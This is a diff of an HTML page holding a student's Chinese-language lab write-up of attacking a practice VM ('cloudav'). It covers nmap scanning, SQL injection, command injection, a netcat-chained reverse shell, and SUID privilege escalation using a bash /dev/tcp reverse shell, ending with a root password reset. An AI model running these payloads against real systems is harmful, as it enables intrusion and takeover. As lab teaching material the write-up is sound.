@@ -3244,7 +3244,7 @@
 
 <p>Network Atk&amp;Def lab4 241840273 杨良灼</p>
 <p>查询攻击机 IP，主机发现：靶机 IP 为 <code>10.0.2.6</code>.</p>
-<pre><code>└─$ sudo ifconfig
+<div class="highlight"><pre><span></span><code>└─$ sudo ifconfig
 eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
         inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
         inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;
@@ -3302,10 +3302,9 @@ All 1000 scanned ports on bogon (10.0.2.4) are in ignored states.
 Not shown: 1000 closed tcp ports (reset)
 
 Nmap done: 256 IP addresses (5 hosts up) scanned in 11.73 seconds
-
-</code></pre>
+</code></pre></div>
 <p>端口扫描.</p>
-<pre><code>└─$ sudo nmap -p22,8080 -sV 10.0.2.6
+<div class="highlight"><pre><span></span><code>└─$ sudo nmap -p22,8080 -sV 10.0.2.6
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 07:39 EDT
 Nmap scan report for bogon (10.0.2.6)
 Host is up (0.00095s latency).
@@ -3318,7 +3317,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.07 seconds
-</code></pre>
+</code></pre></div>
 <p>ssh 的 22 号端口即使是暴力破解也需要用户名，而我们没有，所以尝试从 http 服务入手.</p>
 <p>Werkzeug 是一个 Python web 工具库，通过浏览器访问之：<code>http://10.0.2.6/8080</code></p>
 <p><img alt="4-1" src="../4-1.png" /></p>
@@ -3330,7 +3329,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.07 seconds
 <p>将 <code>#</code> 换为另一个注释方法 <code>--</code> ，得知 <code>" or 1 = 1 --</code> 可以通过：</p>
 <p><img alt="4-4" src="../4-4.png" /></p>
 <p>输入 <code>hello</code> 得到：</p>
-<pre><code>----------- SCAN SUMMARY -----------
+<div class="highlight"><pre><span></span><code>----------- SCAN SUMMARY -----------
 Known viruses: 6691124
 Engine version: 0.100.2
 Scanned directories: 0
@@ -3339,9 +3338,9 @@ Infected files: 0
 Data scanned: 0.00 MB
 Data read: 0.00 MB (ratio 0.00:1)
 Time: 19.845 sec (0 m 19 s)
-</code></pre>
+</code></pre></div>
 <p>尝试加语句：<code>hello; whoami</code></p>
-<pre><code>----------- SCAN SUMMARY -----------
+<div class="highlight"><pre><span></span><code>----------- SCAN SUMMARY -----------
 Known viruses: 6691124
 Engine version: 0.100.2
 Scanned directories: 0
@@ -3351,13 +3350,13 @@ Data scanned: 0.00 MB
 Data read: 0.00 MB (ratio 0.00:1)
 Time: 19.684 sec (0 m 19 s)
 scanner
-</code></pre>
+</code></pre></div>
 <p>得到了 <code>scanner</code>，注意因为可能没有 /dev/tcp，所以尝试 nc 串联的反弹 shell.</p>
 <p>监听端口 <code>1111</code> 和 <code>2222</code> 分别作为输入输出，浏览器中输入：</p>
-<pre><code>hello | nc 10.0.2.4 1111 | /bin/bash | nc 10.0.2.4 2222
-</code></pre>
+<div class="highlight"><pre><span></span><code>hello | nc 10.0.2.4 1111 | /bin/bash | nc 10.0.2.4 2222
+</code></pre></div>
 <p>1111 端口得到，并输入 <code>whoami</code>：</p>
-<pre><code>└─$ nc -lvvp 1111
+<div class="highlight"><pre><span></span><code>└─$ nc -lvvp 1111
 listening on [any] 1111 ...
 Warning: forward host lookup failed for bogon: Unknown host
 connect to [10.0.2.4] from bogon [10.0.2.6] 51660
@@ -3372,49 +3371,48 @@ Data scanned: 0.00 MB
 Data read: 0.00 MB (ratio 0.00:1)
 Time: 20.593 sec (0 m 20 s)
 whoami
-</code></pre>
+</code></pre></div>
 <p>2222 端口得到：</p>
-<pre><code>└─$ nc -lvvp 2222
+<div class="highlight"><pre><span></span><code>└─$ nc -lvvp 2222
 listening on [any] 2222 ...
 Warning: forward host lookup failed for bogon: Unknown host
 connect to [10.0.2.4] from bogon [10.0.2.6] 52576
 scanner
-</code></pre>
+</code></pre></div>
 <p>此时已得到其权限，接下来尝试提权.</p>
 <p>因 <code>/home/scanner</code> 文件中有一个 SUID 文件 <code>update_cloudav</code>，执行之：（2222:）</p>
-<pre><code>This tool lets you update antivirus rules
+<div class="highlight"><pre><span></span><code>This tool lets you update antivirus rules
 Please supply command line arguments for freshclam
-
-</code></pre>
+</code></pre></div>
 <p>然后我们发现：（1111:）</p>
-<pre><code>ls -l
-</code></pre>
+<div class="highlight"><pre><span></span><code>ls -l
+</code></pre></div>
 <p>2222:</p>
-<pre><code>total 20
+<div class="highlight"><pre><span></span><code>total 20
 drwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 cloudav_app
 -rwsr-xr-x 1 root    scanner 8576 Oct 24  2018 update_cloudav
 -rw-rw-r-- 1 scanner scanner  393 Oct 24  2018 update_cloudav.c
-</code></pre>
+</code></pre></div>
 <p>这意味着我们可以通过 SUID 获取 root 权限：（1111:）</p>
-<pre><code>./update_cloudav &quot;--help|whoami&quot;
-</code></pre>
+<div class="highlight"><pre><span></span><code>./update_cloudav &quot;--help|whoami&quot;
+</code></pre></div>
 <p>2222:</p>
-<pre><code>root
-</code></pre>
+<div class="highlight"><pre><span></span><code>root
+</code></pre></div>
 <p>用它反弹 shell 一下获取 root 权限（在此之前应先监听 3433 端口）：（1111:）</p>
-<pre><code>./update_cloudav &quot;--help|echo 'bash -i &gt;&amp; /dev/tcp/10.0.2.4/3433 0&gt;&amp;1'|bash&quot;
-</code></pre>
+<div class="highlight"><pre><span></span><code>./update_cloudav &quot;--help|echo &#39;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3433 0&gt;&amp;1&#39;|bash&quot;
+</code></pre></div>
 <p>得到：</p>
-<pre><code>└─$ nc -lvvp 3433
+<div class="highlight"><pre><span></span><code>└─$ nc -lvvp 3433
 listening on [any] 3433 ...
 Warning: forward host lookup failed for bogon: Unknown host
 connect to [10.0.2.4] from bogon [10.0.2.6] 43734
 bash: cannot set terminal process group (766): Inappropriate ioctl for device
 bash: no job control in this shell
 root@cloudav:~#
-</code></pre>
+</code></pre></div>
 <p>接下来询问用户名，修改密码：</p>
-<pre><code>root@cloudav:~# whoami
+<div class="highlight"><pre><span></span><code>root@cloudav:~# whoami
 whoami
 root
 root@cloudav:~# passwd
@@ -3422,7 +3420,7 @@ passwd
 Enter new UNIX password: s0aked1027
 Retype new UNIX password: s0aked1027
 passwd: password updated successfully
-</code></pre>
+</code></pre></div>
 <p>然后回到靶机 3，登陆之：</p>
 <p>登陆靶机成功.</p>
 
